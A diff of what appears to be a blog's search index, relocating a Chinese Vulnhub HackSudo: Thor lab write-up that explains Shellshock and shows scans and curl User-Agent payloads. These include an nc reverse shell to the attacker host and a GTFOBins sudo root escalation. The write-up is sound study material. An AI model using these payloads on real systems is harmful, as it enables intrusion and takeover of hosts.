@@ -184,154 +184,6 @@
       </tags>
   </entry>
   <entry>
-    <title>10 Vulnhub HackSudoThor Writeup</title>
-    <url>/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/</url>
-    <content><![CDATA[<p>该靶机难度为中等，主要是<strong>破壳漏洞</strong>为第一次遇到，有点没底。</p>
-<span id="more"></span>
-<h1 id="靶机信息">靶机信息</h1>
-<p>靶机地址：<a href="https://www.vulnhub.com/entry/hacksudo-thor,733/">HackSudo: Thor</a></p>
-<p>难度：中</p>
-<p>目标：取得root权限 + 2 Flag</p>
-<p>涉及攻击方法：</p>
-<ul>
-<li>主机发现</li>
-<li>端口扫描</li>
-<li>web路径爬取</li>
-<li><strong>开源源码泄露</strong></li>
-<li>默认账号密码</li>
-<li><strong>破壳漏洞</strong></li>
-<li><strong>GTFOBins提权</strong></li>
-</ul>
-<h1 id="common-gateway-interface-基础">Common Gateway Interface 基础</h1>
-<p>CGI即通用网关接口。通用指的是不受语言限制，理论来说，所有支持标准输出、支持获取环境变量的编程语言都能够编写CGI程序。</p>
-<p>而网关，可以称之为“翻译官”，网关的输入与输出通常是两种不同的协议。比如，一个企业的一台服务器，它的一端连接HTTP协议，另一发可能连接着其他协议，比如企业内部使用的协议。CGI的功能也是如此，通常将CGI部署到Web服务器上，然后由Web服务器调用CGI程序。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412145628.png" /></p>
-<p><strong>接口</strong>，确切而言是“接口协议”。所谓协议，是通信双方或多方都共识并遵守的一套规则。</p>
-<p>其实不管是TCP/IP或是HTTP，都可以统称为“网络协议”，粗浅一点理解就是“<strong>描述报文内容详细语义的协议</strong>”。而“接口协议”却不然，他不会定义哪些字节该写什么，也不会定义字符的内容规范。CGI其实是构架在HTTP协议之上的。它描述的是<strong>另一个维度的共识标准</strong>。</p>
-<center>
-输入
-</center>
-<p>Web服务器调用某个cgi程序，首先把HTTP请求中的信息以环境变量的方式写入OS，然后CGI程序通过语言库函数来获取环境变量从而获得数据的输入。除此之外，还可以通过标准输入获得数据，比如POST请求调用cgi程序时，cgi程序就会通过标准输入获得body中的数据。</p>
-<p>总结：</p>
-<ol type="1">
-<li>如果不经过HTTP请求，那么cgi程序获得整个OS的环境变量；</li>
-<li>如果经过HTTP请求，那么cgi程序除了获得整个OS的环境变量之外，还会额外获得HTTP头部信息；</li>
-</ol>
-<center>
-输出
-</center>
-<p>CGI通过标注输出写数据，需要注意的是，此时CGI承担HTTP协议的响应部分，因此需要将HTTP响应头部也要通过标准输出打印。</p>
-<h1 id="破壳漏洞">破壳漏洞</h1>
-<h2 id="概述">概述</h2>
-<p>Bash 4.3以及之前的版本在处理某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行任意的shell命令,甚至完全控制目标系统。</p>
-<h2 id="前置技术">前置技术</h2>
-<p>参考链接：https://www.freebuf.com/articles/system/279713.html</p>
-<h3 id="bash基础">bash基础</h3>
-<p>在bash中，可以自定义变量，如下</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412150632.png" /></p>
-<p>但是定义的这个变量只是局部的，如果用当前的bash从新开启一个子进程，则无法输出</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412150720.png" /></p>
-<p>那么如何才能让子进程或者其他进程也能够访问该变量呢？答案就是将该变量设置为环境变量，因为环境变量是全局变量。可以通过<code>export</code>命令添加全局变量</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412150859.png" /></p>
-<p>在bash中还可以定义shell函数并将其导出为环境变量，只要加上参数<code>-f</code>即可。如果不将函数设置为全局变量，那么子进程同样无法使用，如下</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412151157.png" /></p>
-<p>将函数导入全局变量之后</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412151245.png" /></p>
-<p>bash中还可以<strong>通过环境变量来定义函数</strong>。当某个环境变量的值以字符串<code>()&#123;</code>的格式作为开头，那么该变量就会被当前的bash当作一个导出函数，该函数仅在当前bash的子进程生效。（版本较高的bash则不能这么做，因此我利用<a href="https://github.com/vulhub/vulhub/blob/master/bash/CVE-2014-6271/README.zh-cn.md">vulhub/bash/shellshock</a>做测试）</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412193956.png" /></p>
-<h2 id="影响的版本">影响的版本</h2>
-<p>bash version &lt;= 4.3</p>
-<h2 id="漏洞复现">漏洞复现</h2>
-<p><a href="https://hdfzzf.icu/2022/04/12/%E5%A4%8D%E7%8E%B0%EF%BC%9ABash%20Shellshock%20%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2014-6271%EF%BC%89/">复现：Bash Shellshock 破壳漏洞（CVE-2014-6271)</a></p>
-<h2 id="利用分析">利用分析</h2>
-<p><strong>漏洞原理</strong>：</p>
-<p>Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以<code>()&#123;</code>开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在<strong>输入的过滤中没有严格限制边界，也没有做出合法化的参数判断</strong>。</p>
-<p><strong>接下来才是漏洞产生的重点：</strong></p>
-<p>如果我们导入如下的字符串为全局变量： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> func=<span class="string">&#x27;() &#123; echo &quot;hello world!&quot;; &#125;; cat /etc/passwd;&#x27;</span></span><br></pre></td></tr></table></figure></p>
-<p>那么在当前进程下<code>func</code>不会被执行。而一旦启动子进程<code>bash</code>，则会立即执行<code>cat /etc/passwd</code>，如下</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412194456.png" /></p>
-<p>并且此时<code>func</code>也会被当作函数执行。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412194527.png" /></p>
-<p>这是因为子进程<code>bash</code>在加载环境变量时首先将<code>func</code>函数当作环境变量，然后继续加载后面的<code>cat /etc/passwd</code>，此时因为还处在shell中，会将这串字符串当作shell命令执行。因此一旦启动子进程<code>bash</code>，就会立即执行这串代码。</p>
-<p>所以该漏洞需要以下条件： 1. 被攻击的bash存在漏洞（版本小于等于4.3） 2. 攻击者可以控制环境变量 3. 新的bash进程被打开触发漏洞并执行命令</p>
-<p>当 CGI 脚本接收到一次 HTTP 请求 , 它的环境变量就会新增一些条目 , 比如 User-Agent , Connection 等信息。因此 , 在给出的 POC 中 , 我们通过修改 User-Agent 来修改 CGI 环境变量 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">() &#123; :; &#125;; echo; command;</span><br></pre></td></tr></table></figure></p>
-<blockquote>
-<p>中间那个<code>:</code>可以用其他字符代替，一定要有字符！ 中间那个<code>echo</code> 不能省略。HTTP头部信息每一行都是独立的信息，这里的echo就充当换行符。（不是很能理解这里的意思）</p>
-</blockquote>
-<h2 id="利用场景">利用场景</h2>
-<ul>
-<li><p>程序在某一时刻使用 bash 作为脚本解释器处理环境变量赋值</p></li>
-<li><p>环境变量的赋值字符串来源于用户输入 , 且没有通过有效的过滤</p></li>
-</ul>
-<h1 id="渗透">渗透</h1>
-<p>kali：10.0.2.4</p>
-<h2 id="主机发现端口扫描端口服务发现">主机发现、端口扫描、端口服务发现</h2>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.13</span><br><span class="line">sudo nmap -p21,22,80 -sV 10.0.2.13</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412143045.png" /></p>
-<ul>
-<li>21端口的服务为ftp</li>
-<li>22端口的服务为ssh</li>
-<li>80端口的服务为http，apache2.4.38</li>
-<li>靶机操作系统为debian</li>
-</ul>
-<h2 id="访问http服务">访问http服务</h2>
-<p>页面是一个登陆界面，尝试了一下弱口令，发现没有用。又去看了源码，没有什么有用的新，然后依次又查看了<code>HOME, NEWS, CONCAT, ABOUT US</code>发现都没有什么有用的信息。不过<code>CONCAT</code>下面有许多个人信息，可以尝试一下账号和密码是否与这有关。</p>
-<p>接着进行路径发现。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.13</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412143520.png" /></p>
-<p>先查看一下<code>README.md</code>，在里面发现了这个网站是用一个开源的框架搭建的，并且还给出了地址 https://github.com/zakee94/online-banking-system</p>
-<p>访问网站，找到了下面这句话： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">However some important usernames and passwords are provided below :</span><br><span class="line">Username of admin is &quot;admin&quot; &amp; password is &quot;password123&quot;.</span><br><span class="line">Username of most of the customers is their &quot;first_name&quot; &amp; password is their &quot;first_name&quot; followed by &quot;123&quot;.</span><br></pre></td></tr></table></figure></p>
-<p>给出了admin用户的默认账号和密码，以及普通用户的默认账号和默认密码格式。</p>
-<p>除此之外，还扫描出了<code>admin_login.php</code>。这很明显应该是后台登录地址。尝试刚刚获得的默认账号和密码进行登陆。发现直接登录成功了！</p>
-<p>在网站进行信息收集，发现该网站存在着业务逻辑漏洞，也就是可以从后台看到所有人的账号和密码，还可以利用这些密码进行转账，因为该网站没有严格限制登陆密码和支付密码不能一致，所以现存的账号的登录密码和支付密码一致，因此可以盗用这些账号密码，然后登录，之后给自己的账号转账即可。虽然业务逻辑漏洞在打靶过程中没有什么用，但是在现实生活中是直接造成经济损失的。</p>
-<h2 id="破壳漏洞get-shell">破壳漏洞get shell</h2>
-<p>之前在源码中看到了<code>&lt;!-- cgi-bin --&gt;</code>这其实就是使用了CGI技术，使用该技术可能存在着一种漏洞，那就是<strong>破壳漏洞</strong>！</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.13/cgi-bin/ -f -e cgi,sh</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412152211.png" /></p>
-<p>500：表示我们提交的参数在执行过程中发生了错误，但是不代表我们访问的文件不存在，反而证明文件应该是存在的。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p80 --script http-shellshock --script-args uri=/cgi-bin/shell.sh,cmd=ls 10.0.2.13</span><br><span class="line"><span class="comment"># http-shellshock 专门用来测试是否存在破壳漏洞</span></span><br><span class="line"><span class="comment"># 如果最后的命令执行成功，说明存在漏洞</span></span><br><span class="line"><span class="comment"># uri=/cgi-bin/shell.sh 要检测的文件路径</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412152316.png" /></p>
-<p>发现确实存在破壳漏洞。也可以对<code>backup.cgi</code>进行测试一下。下面的代码就利用（<code>-A</code>等价于<code>-H</code>，都是指定<code>user-agent</code>）</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -H <span class="string">&quot;user-agent:() &#123; :; &#125;; echo; /bin/bash -c &#x27;which nc&#x27;&quot;</span> \http://10.0.2.13/cgi-bin/shell.sh</span><br><span class="line"><span class="comment"># 如果存在nc，就可以利用nc反弹。先用-e的尝试一下，如果不可以再用nc串联</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412172426.png" /></p>
-<p>此时能够百分之百确定存在破壳漏洞。接着反弹shell <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -H <span class="string">&quot;user-agent:() &#123; :; &#125;; echo; echo; /bin/bash -c &#x27;nc -e /bin/bash 10.0.2.4 4444&#x27;&quot;</span> \http://10.0.2.13/cgi-bin/shell.sh</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412154821.png" /></p>
-<p>反弹成功！</p>
-<h2 id="权限提升">权限提升</h2>
-<p>首先查看一下sudo配置<code>sudo -l</code></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412155743.png" /></p>
-<p>发现了奇怪的东西，我们尝试执行一下 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u thor /home/thor/./hammer.sh</span><br></pre></td></tr></table></figure></p>
-<p>然后要求我们输入，我们输入几条系统命令看一下</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412155919.png" /></p>
-<p>猜测：第一个输入点，无论我们输入什么都会被返回；而第二个输入点则会执行命令。刚刚的<code>id</code>可以看出，该程序的权限是<code>thor</code>，如果该程序执行<code>bash</code>则会得到<code>thor</code>权限的bash。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160049.png" /></p>
-<p>果不其然，成功得到<code>thor</code>的权限。第一个flag在<code>/home/thor/user.txt</code></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160245.png" /></p>
-<p>然后需要想办法提权到root，再次查看sudo配置<code>sudo -l</code></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160315.png" /></p>
-<p>这里涉及到<strong>GTFOBins提权：针对目标系统自带的应用程序配置不当导致提权</strong>，参考链接：<a href="https://gtfobins.github.io">gtfobins</a></p>
-<p>网站中提到</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160423.png" /></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160429.png" /></p>
-<p>因为我们需要提权到root，所以使用后者中的<code>Shell</code>的命令，也就是如下命令： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /usr/sbin/service ../../bin/bash</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160607.png" /></p>
-<p>成功提权到root！接下来获取第二个flag<code>/root/root.txt</code></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160550.png" /></p>
-<p>其实也可以通过<code>/usr/bin/cat</code>直接读取flag。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160915.png" /></p>
-<p>本台靶机到此结束！</p>
-<h1 id="总结">总结</h1>
-<p>该靶机的难度主要在于<strong>破壳漏洞</strong>的发现以及 <strong>GTFOBins漏洞</strong>利用。练习这么多个靶机以来第一次碰到这样的漏洞以及利用方式。</p>
-<p>还有一点，就是如果发现目标站点使用的是开源的框架，可以尝试以下默认的账号和密码。</p>
-]]></content>
-      <tags>
-        <tag>综合</tag>
-        <tag>vulnhub</tag>
-        <tag>破壳漏洞</tag>
-        <tag>开源源码泄露</tag>
-        <tag>GTFOBins提权</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>11 Vulnhub Billu_b0x Writeup</title>
     <url>/2022/04/14/11%20Vulnhub%20Billu_b0x%20Writeup/</url>
     <content><![CDATA[<p>该靶机难度为中等，不过存在多种思路。肯定还有一些我没有记录到。该靶机的漏洞都比较常规，但是组合起来就有了非常好的表现！</p>
@@ -614,6 +466,154 @@
       <tags>
         <tag>综合</tag>
         <tag>vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>10 Vulnhub HackSudoThor Writeup</title>
+    <url>/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/</url>
+    <content><![CDATA[<p>该靶机难度为中等，主要是<strong>破壳漏洞</strong>为第一次遇到，有点没底。</p>
+<span id="more"></span>
+<h1 id="靶机信息">靶机信息</h1>
+<p>靶机地址：<a href="https://www.vulnhub.com/entry/hacksudo-thor,733/">HackSudo: Thor</a></p>
+<p>难度：中</p>
+<p>目标：取得root权限 + 2 Flag</p>
+<p>涉及攻击方法：</p>
+<ul>
+<li>主机发现</li>
+<li>端口扫描</li>
+<li>web路径爬取</li>
+<li><strong>开源源码泄露</strong></li>
+<li>默认账号密码</li>
+<li><strong>破壳漏洞</strong></li>
+<li><strong>GTFOBins提权</strong></li>
+</ul>
+<h1 id="common-gateway-interface-基础">Common Gateway Interface 基础</h1>
+<p>CGI即通用网关接口。通用指的是不受语言限制，理论来说，所有支持标准输出、支持获取环境变量的编程语言都能够编写CGI程序。</p>
+<p>而网关，可以称之为“翻译官”，网关的输入与输出通常是两种不同的协议。比如，一个企业的一台服务器，它的一端连接HTTP协议，另一发可能连接着其他协议，比如企业内部使用的协议。CGI的功能也是如此，通常将CGI部署到Web服务器上，然后由Web服务器调用CGI程序。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412145628.png" /></p>
+<p><strong>接口</strong>，确切而言是“接口协议”。所谓协议，是通信双方或多方都共识并遵守的一套规则。</p>
+<p>其实不管是TCP/IP或是HTTP，都可以统称为“网络协议”，粗浅一点理解就是“<strong>描述报文内容详细语义的协议</strong>”。而“接口协议”却不然，他不会定义哪些字节该写什么，也不会定义字符的内容规范。CGI其实是构架在HTTP协议之上的。它描述的是<strong>另一个维度的共识标准</strong>。</p>
+<center>
+输入
+</center>
+<p>Web服务器调用某个cgi程序，首先把HTTP请求中的信息以环境变量的方式写入OS，然后CGI程序通过语言库函数来获取环境变量从而获得数据的输入。除此之外，还可以通过标准输入获得数据，比如POST请求调用cgi程序时，cgi程序就会通过标准输入获得body中的数据。</p>
+<p>总结：</p>
+<ol type="1">
+<li>如果不经过HTTP请求，那么cgi程序获得整个OS的环境变量；</li>
+<li>如果经过HTTP请求，那么cgi程序除了获得整个OS的环境变量之外，还会额外获得HTTP头部信息；</li>
+</ol>
+<center>
+输出
+</center>
+<p>CGI通过标注输出写数据，需要注意的是，此时CGI承担HTTP协议的响应部分，因此需要将HTTP响应头部也要通过标准输出打印。</p>
+<h1 id="破壳漏洞">破壳漏洞</h1>
+<h2 id="概述">概述</h2>
+<p>Bash 4.3以及之前的版本在处理某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行任意的shell命令,甚至完全控制目标系统。</p>
+<h2 id="前置技术">前置技术</h2>
+<p>参考链接：https://www.freebuf.com/articles/system/279713.html</p>
+<h3 id="bash基础">bash基础</h3>
+<p>在bash中，可以自定义变量，如下</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412150632.png" /></p>
+<p>但是定义的这个变量只是局部的，如果用当前的bash从新开启一个子进程，则无法输出</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412150720.png" /></p>
+<p>那么如何才能让子进程或者其他进程也能够访问该变量呢？答案就是将该变量设置为环境变量，因为环境变量是全局变量。可以通过<code>export</code>命令添加全局变量</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412150859.png" /></p>
+<p>在bash中还可以定义shell函数并将其导出为环境变量，只要加上参数<code>-f</code>即可。如果不将函数设置为全局变量，那么子进程同样无法使用，如下</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412151157.png" /></p>
+<p>将函数导入全局变量之后</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412151245.png" /></p>
+<p>bash中还可以<strong>通过环境变量来定义函数</strong>。当某个环境变量的值以字符串<code>()&#123;</code>的格式作为开头，那么该变量就会被当前的bash当作一个导出函数，该函数仅在当前bash的子进程生效。（版本较高的bash则不能这么做，因此我利用<a href="https://github.com/vulhub/vulhub/blob/master/bash/CVE-2014-6271/README.zh-cn.md">vulhub/bash/shellshock</a>做测试）</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412193956.png" /></p>
+<h2 id="影响的版本">影响的版本</h2>
+<p>bash version &lt;= 4.3</p>
+<h2 id="漏洞复现">漏洞复现</h2>
+<p><a href="https://hdfzzf.icu/2022/04/12/%E5%A4%8D%E7%8E%B0%EF%BC%9ABash%20Shellshock%20%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2014-6271%EF%BC%89/">复现：Bash Shellshock 破壳漏洞（CVE-2014-6271)</a></p>
+<h2 id="利用分析">利用分析</h2>
+<p><strong>漏洞原理</strong>：</p>
+<p>Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以<code>()&#123;</code>开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在<strong>输入的过滤中没有严格限制边界，也没有做出合法化的参数判断</strong>。</p>
+<p><strong>接下来才是漏洞产生的重点：</strong></p>
+<p>如果我们导入如下的字符串为全局变量： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> func=<span class="string">&#x27;() &#123; echo &quot;hello world!&quot;; &#125;; cat /etc/passwd;&#x27;</span></span><br></pre></td></tr></table></figure></p>
+<p>那么在当前进程下<code>func</code>不会被执行。而一旦启动子进程<code>bash</code>，则会立即执行<code>cat /etc/passwd</code>，如下</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412194456.png" /></p>
+<p>并且此时<code>func</code>也会被当作函数执行。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412194527.png" /></p>
+<p>这是因为子进程<code>bash</code>在加载环境变量时首先将<code>func</code>函数当作环境变量，然后继续加载后面的<code>cat /etc/passwd</code>，此时因为还处在shell中，会将这串字符串当作shell命令执行。因此一旦启动子进程<code>bash</code>，就会立即执行这串代码。</p>
+<p>所以该漏洞需要以下条件： 1. 被攻击的bash存在漏洞（版本小于等于4.3） 2. 攻击者可以控制环境变量 3. 新的bash进程被打开触发漏洞并执行命令</p>
+<p>当 CGI 脚本接收到一次 HTTP 请求 , 它的环境变量就会新增一些条目 , 比如 User-Agent , Connection 等信息。因此 , 在给出的 POC 中 , 我们通过修改 User-Agent 来修改 CGI 环境变量 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">() &#123; :; &#125;; echo; command;</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>中间那个<code>:</code>可以用其他字符代替，一定要有字符！ 中间那个<code>echo</code> 不能省略。HTTP头部信息每一行都是独立的信息，这里的echo就充当换行符。（不是很能理解这里的意思）</p>
+</blockquote>
+<h2 id="利用场景">利用场景</h2>
+<ul>
+<li><p>程序在某一时刻使用 bash 作为脚本解释器处理环境变量赋值</p></li>
+<li><p>环境变量的赋值字符串来源于用户输入 , 且没有通过有效的过滤</p></li>
+</ul>
+<h1 id="渗透">渗透</h1>
+<p>kali：10.0.2.4</p>
+<h2 id="主机发现端口扫描端口服务发现">主机发现、端口扫描、端口服务发现</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.13</span><br><span class="line">sudo nmap -p21,22,80 -sV 10.0.2.13</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412143045.png" /></p>
+<ul>
+<li>21端口的服务为ftp</li>
+<li>22端口的服务为ssh</li>
+<li>80端口的服务为http，apache2.4.38</li>
+<li>靶机操作系统为debian</li>
+</ul>
+<h2 id="访问http服务">访问http服务</h2>
+<p>页面是一个登陆界面，尝试了一下弱口令，发现没有用。又去看了源码，没有什么有用的新，然后依次又查看了<code>HOME, NEWS, CONCAT, ABOUT US</code>发现都没有什么有用的信息。不过<code>CONCAT</code>下面有许多个人信息，可以尝试一下账号和密码是否与这有关。</p>
+<p>接着进行路径发现。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.13</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412143520.png" /></p>
+<p>先查看一下<code>README.md</code>，在里面发现了这个网站是用一个开源的框架搭建的，并且还给出了地址 https://github.com/zakee94/online-banking-system</p>
+<p>访问网站，找到了下面这句话： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">However some important usernames and passwords are provided below :</span><br><span class="line">Username of admin is &quot;admin&quot; &amp; password is &quot;password123&quot;.</span><br><span class="line">Username of most of the customers is their &quot;first_name&quot; &amp; password is their &quot;first_name&quot; followed by &quot;123&quot;.</span><br></pre></td></tr></table></figure></p>
+<p>给出了admin用户的默认账号和密码，以及普通用户的默认账号和默认密码格式。</p>
+<p>除此之外，还扫描出了<code>admin_login.php</code>。这很明显应该是后台登录地址。尝试刚刚获得的默认账号和密码进行登陆。发现直接登录成功了！</p>
+<p>在网站进行信息收集，发现该网站存在着业务逻辑漏洞，也就是可以从后台看到所有人的账号和密码，还可以利用这些密码进行转账，因为该网站没有严格限制登陆密码和支付密码不能一致，所以现存的账号的登录密码和支付密码一致，因此可以盗用这些账号密码，然后登录，之后给自己的账号转账即可。虽然业务逻辑漏洞在打靶过程中没有什么用，但是在现实生活中是直接造成经济损失的。</p>
+<h2 id="破壳漏洞get-shell">破壳漏洞get shell</h2>
+<p>之前在源码中看到了<code>&lt;!-- cgi-bin --&gt;</code>这其实就是使用了CGI技术，使用该技术可能存在着一种漏洞，那就是<strong>破壳漏洞</strong>！</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.13/cgi-bin/ -f -e cgi,sh</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412152211.png" /></p>
+<p>500：表示我们提交的参数在执行过程中发生了错误，但是不代表我们访问的文件不存在，反而证明文件应该是存在的。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p80 --script http-shellshock --script-args uri=/cgi-bin/shell.sh,cmd=ls 10.0.2.13</span><br><span class="line"><span class="comment"># http-shellshock 专门用来测试是否存在破壳漏洞</span></span><br><span class="line"><span class="comment"># 如果最后的命令执行成功，说明存在漏洞</span></span><br><span class="line"><span class="comment"># uri=/cgi-bin/shell.sh 要检测的文件路径</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412152316.png" /></p>
+<p>发现确实存在破壳漏洞。也可以对<code>backup.cgi</code>进行测试一下。下面的代码就利用（<code>-A</code>等价于<code>-H</code>，都是指定<code>user-agent</code>）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -H <span class="string">&quot;user-agent:() &#123; :; &#125;; echo; /bin/bash -c &#x27;which nc&#x27;&quot;</span> \http://10.0.2.13/cgi-bin/shell.sh</span><br><span class="line"><span class="comment"># 如果存在nc，就可以利用nc反弹。先用-e的尝试一下，如果不可以再用nc串联</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412172426.png" /></p>
+<p>此时能够百分之百确定存在破壳漏洞。接着反弹shell <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -H <span class="string">&quot;user-agent:() &#123; :; &#125;; echo; echo; /bin/bash -c &#x27;nc -e /bin/bash 10.0.2.4 4444&#x27;&quot;</span> \http://10.0.2.13/cgi-bin/shell.sh</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412154821.png" /></p>
+<p>反弹成功！</p>
+<h2 id="权限提升">权限提升</h2>
+<p>首先查看一下sudo配置<code>sudo -l</code></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412155743.png" /></p>
+<p>发现了奇怪的东西，我们尝试执行一下 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u thor /home/thor/./hammer.sh</span><br></pre></td></tr></table></figure></p>
+<p>然后要求我们输入，我们输入几条系统命令看一下</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412155919.png" /></p>
+<p>猜测：第一个输入点，无论我们输入什么都会被返回；而第二个输入点则会执行命令。刚刚的<code>id</code>可以看出，该程序的权限是<code>thor</code>，如果该程序执行<code>bash</code>则会得到<code>thor</code>权限的bash。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160049.png" /></p>
+<p>果不其然，成功得到<code>thor</code>的权限。第一个flag在<code>/home/thor/user.txt</code></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160245.png" /></p>
+<p>然后需要想办法提权到root，再次查看sudo配置<code>sudo -l</code></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160315.png" /></p>
+<p>这里涉及到<strong>GTFOBins提权：针对目标系统自带的应用程序配置不当导致提权</strong>，参考链接：<a href="https://gtfobins.github.io">gtfobins</a></p>
+<p>网站中提到</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160423.png" /></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160429.png" /></p>
+<p>因为我们需要提权到root，所以使用后者中的<code>Shell</code>的命令，也就是如下命令： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /usr/sbin/service ../../bin/bash</span><br></pre></td></tr></table></figure></p>
